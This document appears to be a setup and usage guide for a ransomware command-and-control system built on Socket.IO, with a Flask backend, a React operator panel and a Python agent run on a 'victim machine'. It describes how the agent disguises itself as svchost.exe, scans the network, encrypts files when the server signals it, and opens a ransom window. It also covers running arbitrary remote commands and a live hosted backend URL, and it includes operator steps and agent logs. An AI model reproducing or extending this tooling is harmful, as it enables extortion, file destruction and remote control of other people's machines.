# Socket.IO Complete Usage Guide

> Note: In this deployment, the backend base URL is configured to https://sample-2ang.onrender.com. Wherever this guide shows localhost examples, substitute with https://sample-2ang.onrender.com.

## 🎯 Socket Initialization Flow

### **1. Backend Initialization** (Server-Side)

```
Start: python3 py_simple/server.py
  ↓
server.py line 35: from .socket_core import init_socketio
  ↓
server.py line 57: socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)
  ↓
socket_core.py line 15: def init_socketio(app, devices_registry, processor)
  ↓
socket_core.py line 24: socketio = SocketIO(app, cors_allowed_origins="*")
  ↓
Registers all event handlers (@socketio.on)
  ↓
Returns socketio instance to server.py
  ↓
Backend Socket.IO ready! Listening on http://localhost:8080/socket.io/
```

**Key File:** `py_simple/server.py`
```python
# Line 57 - This is where Socket.IO gets initialized!
socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)
```

---

### **2. Frontend Initialization** (React UI)

```
User opens browser: http://localhost:8080
  ↓
EliteUI.jsx loads (useEffect on mount)
  ↓
EliteUI.jsx line 48: socketRef.current = initSocket({ apiBase, ... })
  ↓
socketClient.js line 5: export function initSocket({ apiBase, ... })
  ↓
socketClient.js line 12: const s = io(origin, { path: '/socket.io' })
  ↓
Frontend Socket.IO connected!
  ↓
socketClient.js line 15: s.on('connect', () => { ... })
  ↓
Frontend emits events: 'site_restore', 'site_run', etc.
```

**Key File:** `site/frontend/src/EliteUI.jsx`
```javascript
// Line 48 - Frontend initializes Socket.IO client
useEffect(() => {
  socketRef.current = initSocket({
    apiBase: API_BASE,
    onStatus: (st) => setSocketStatus(st),
    onScriptOutput: (payload) => setLastOutput(payload)
  })
}, [API_BASE])
```

---

### **3. Agent Initialization** (Victim Machine)

```
Agent starts: python3 py_simple/agent_sync.py --backend https://sample-2ang.onrender.com
  ↓
agent_sync.py line 138: res = session.post(f"{backend}/publickey", ...)
  ↓
Gets device_token from backend
  ↓
agent_sync.py line 170: sio = socketio.Client(...)
  ↓
agent_sync.py line 357: sio.connect(backend, transports=['websocket', 'polling'])
  ↓
Agent Socket.IO connected!
  ↓
agent_sync.py line 180: sio.emit("authenticate", {"device_token": device_token})
  ↓
Agent listens for: 'process', 'restore', 'run_script'
```

**Key File:** `py_simple/agent_sync.py`
```python
# Line 170 - Agent creates Socket.IO client
sio = socketio.Client(
    reconnection=True,
    http_session=session,
)

# Line 357 - Agent connects to backend
sio.connect(
    socket_base,
    transports=["websocket", "polling"],
    socketio_path='socket.io'
)
```

---

## 📡 Complete Socket.IO Event Flow

### **Architecture:**
```
┌─────────────┐         ┌─────────────┐         ┌─────────────┐
│  Frontend   │◄───────►│   Backend   │◄───────►│    Agent    │
│  (React)    │ Socket  │   (Flask)   │ Socket  │  (Python)   │
│             │  .IO    │             │  .IO    │             │
└─────────────┘         └─────────────┘         └─────────────┘
      ↓                       ↓                       ↓
 initSocket()          init_socketio()        socketio.Client()
```

---

## 🚀 How to Use - Step by Step

### **Step 1: Start the Backend**

```bash
cd /home/hari/backup/rans_sample
python3 py_simple/server.py
```

**What happens:**
1. Flask app starts
2. Line 57: `socketio = init_socketio(...)` executes
3. Socket.IO server starts listening
4. Backend ready at: `http://localhost:8080`
5. Socket.IO endpoint: `ws://localhost:8080/socket.io/`

**You'll see:**
```
 * Running on http://127.0.0.1:8080
 * Restarting with stat
```

---

### **Step 2: Open the Frontend**

```bash
# Option A: If backend serves static files
Open browser: http://localhost:8080

# Option B: If running dev server
cd site/frontend
npm run dev
# Then open: http://localhost:5173
```

**What happens:**
1. Browser loads EliteUI.jsx
2. `useEffect` runs (line 48)
3. `initSocket()` creates Socket.IO client
4. Auto-connects to backend
5. Status indicator shows: 🟢 Connected

**Browser Console:**
```
Socket.IO connecting to http://localhost:8080
Connected!
```

---

### **Step 3: Start an Agent (Victim Machine)**

```bash
# On Windows VM or test machine
cd C:\Users\user\py_sample
python py_simple\agent_sync.py --backend http://YOUR_BACKEND_IP:8080

# Example:
python py_simple\agent_sync.py --backend http://192.168.1.100:8080
```

**What happens:**
1. Agent masquerades as `svchost.exe` or similar
2. Scans network for targets
3. Registers with backend: POST /publickey
4. Gets device_token
5. Connects via Socket.IO
6. Authenticates with device_token
7. Backend sets `pending_encrypt=True`
8. Backend auto-sends `'process'` event
9. Agent encrypts files + launches ransom window

**Agent Console:**
```
[client] Process name set to: svchost.exe
[client] Initiating network reconnaissance...
[client] Network scan complete: 3 active targets found
[client] Received device token: abc123...
[client] Connected to server, authenticating…
[client] Authenticated.
[client] Received ENCRYPT signal – starting file processing…
[client] Processed files: 15
[client] Ransom window launched
```

---

## 🎮 Frontend Usage

### **View Connected Devices:**
1. Open http://localhost:8080
2. Look at left sidebar
3. Devices appear automatically when agents connect
4. Green dot = Online, Gray dot = Offline

### **Select a Device:**
```
Click device name in sidebar → Turns blue
```

### **Run Scripts:**
```
1. Select device (sidebar)
2. Click "Scripts" tab
3. Check "Script A (agent_sync)"
4. Click "Run Selected"
5. Output appears in "Terminal" tab
```

### **Execute Custom Command:**
```
1. Select device (sidebar)
2. Click "Terminal" tab
3. Type: whoami
4. Click "Execute"
5. See output below
```

### **Decrypt Files:**
```
1. Select device (sidebar)
2. Click "Keys" tab
3. Paste RSA private key
4. Click "Restore with Private Key"
5. Files decrypted on agent machine
```

---

## 🔌 Socket.IO Event Reference

### **Backend Events (socket_core.py):**

| Event | Direction | Purpose |
|-------|-----------|---------|
| `connect` | Client → Server | Client connects |
| `authenticate` | Client → Server | Agent sends device_token |
| `device_hello` | Client → Server | Agent sends hostname/IP |
| `site_restore` | Frontend → Server | Trigger decryption |
| `site_run` | Frontend → Server | Run script on agent |
| `script_output` | Agent → Server → Frontend | Command output |
| `disconnect` | Client ← Server | Connection lost |

### **Agent Events (agent_sync.py):**

| Event | Direction | Purpose |
|-------|-----------|---------|
| `process` | Server → Agent | Trigger file encryption |
| `restore` | Server → Agent | Trigger file decryption |
| `run_script` | Server → Agent | Execute command |
| `script_output` | Agent → Server | Send command results |

---

## 🧪 Testing Socket.IO

### **Test 1: Backend Socket Listening**

```bash
# Check if Socket.IO is running
curl http://localhost:8080/socket.io/
```

**Expected Response:**
```json
{"code":0,"message":"Transport unknown"}
```
✅ This is GOOD! It means Socket.IO is listening.

---

### **Test 2: Frontend Connection**

```javascript
// Open browser console (F12)
// You should see:
Socket.IO connecting...
Connected!
```

Or check the status indicator in the top right (green dot = connected).

---

### **Test 3: Agent Connection**

```bash
# Run agent
python3 py_simple/agent_sync.py --backend http://localhost:8080

# Watch for these lines:
[client] Connected to server, authenticating…
[client] Authenticated.
```

Then check frontend - device should appear in sidebar!

---

## 📋 Socket.IO Initialization Checklist

### **Backend:**
- ✅ Line 35: Import `init_socketio`
- ✅ Line 40: Create `DEVICES` dictionary
- ✅ Line 57: Call `socketio = init_socketio(...)`
- ✅ socket_core.py: All `@socketio.on` handlers registered
- ✅ CORS enabled: `cors_allowed_origins="*"`

### **Frontend:**
- ✅ socketClient.js: `io()` imported from 'socket.io-client'
- ✅ EliteUI.jsx line 48: `initSocket()` called in useEffect
- ✅ Socket events registered: `s.on('connect')`, `s.on('script_output')`
- ✅ socketRef stored for emitting events

### **Agent:**
- ✅ Line 170: `sio = socketio.Client()` created
- ✅ Line 357: `sio.connect()` to backend
- ✅ Line 180: `sio.emit('authenticate')` sent
- ✅ Event handlers: `@sio.on('process')`, `@sio.on('restore')`

---

## 🔧 Troubleshooting

### **Problem: "No devices showing in frontend"**

**Check 1:** Is backend running?
```bash
curl http://localhost:8080/status
# Should return: {"ok": true, ...}
```

**Check 2:** Is agent connected?
```bash
# Agent console should show:
[client] Authenticated.
```

**Check 3:** Check DEVICES registry
```bash
# Backend should log:
Device registered: hostname-xyz
```

---

### **Problem: "Socket.IO connection failed"**

**Cause 1:** Wrong URL
```javascript
// Frontend should connect to same host as backend
origin = 'http://localhost:8080'  // ✓
origin = 'http://localhost:5000'  // ✗ Wrong port
```

**Cause 2:** CORS issue
```python
# Backend should have:
socketio = SocketIO(app, cors_allowed_origins="*")  # ✓
```

**Cause 3:** Firewall blocking
```bash
# Allow port 8080
sudo ufw allow 8080
```

---

### **Problem: "Events not triggering"**

**Check event names match:**
```python
# Backend emits:
socketio.emit('restore', payload, to=sid)

# Agent listens:
@sio.on('restore')  # ✓ Must match!
```

---

## 📝 Summary

### **Where Socket.IO Gets Initialized:**

1. **Backend:** `server.py` line 57
   ```python
   socketio = init_socketio(app, devices_registry=DEVICES, processor=processor)
   ```

2. **Frontend:** `EliteUI.jsx` line 48
   ```javascript
   socketRef.current = initSocket({ apiBase: API_BASE, ... })
   ```

3. **Agent:** `agent_sync.py` line 170 & 357
   ```python
   sio = socketio.Client(...)
   sio.connect(backend, ...)
   ```

### **Complete Flow:**
```
1. Start backend     → Socket.IO server starts on port 8080
2. Open frontend     → Socket.IO client connects automatically
3. Start agent       → Socket.IO client connects, authenticates
4. Agent appears     → Shows in frontend sidebar
5. Click device      → Device selected (turns blue)
6. Run scripts       → Commands sent via Socket.IO
7. See output        → Results come back via Socket.IO
```

**Everything is real-time via WebSockets!** No polling, no delays. 🚀

---

## 🎯 Quick Start Commands

```bash
# Terminal 1: Backend
cd /home/hari/backup/rans_sample
python3 py_simple/server.py

# Terminal 2: Agent (for testing)
python3 py_simple/agent_sync.py --backend http://localhost:8080

# Browser: Frontend
http://localhost:8080

# That's it! Socket.IO connects everything automatically.
```
